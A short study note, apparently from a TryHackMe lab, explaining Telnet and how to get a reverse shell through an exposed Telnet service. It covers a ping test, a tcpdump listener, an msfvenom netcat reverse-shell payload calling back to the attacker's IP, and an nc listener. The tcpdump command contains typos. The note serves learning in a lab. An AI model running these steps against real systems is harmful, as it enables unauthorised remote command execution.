Telnet is similar to [[SSH - Secure Shell]] but it's not encrypted.
It is used for remote connection to a machine to execute commands.

It operates via [[TCP]] on port 23.

If you connect to a telnet and try to run commands, you may see no output.
Try running this.
```shell
.RUN ping [your_ip]
```
But first setup a tcpdump on your end.
```shell
sudo tcpdump ip poroto \\icmp -i tun0
# this listnens for icmp (ping) on network interface tun0
# which in this case is THM vpn tunnel.
```

Once you see that the pings are coming thru on tcp dump.
You know that you can run commands.

With that knowledge, you can craft a netcat reverse shell via msfvenom.
A payload maker if you will.
```shell
msfvenom -p cmd/unix/reverse_netcat lhost=[your_ip] lport=4444 -R
```
msfvenom documentation: https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html

The command msfvenom generates can be ran with .RUN and don't forget the listener.
nc -nvlp 4444

[[Getting the shell]] read more on reverse shell.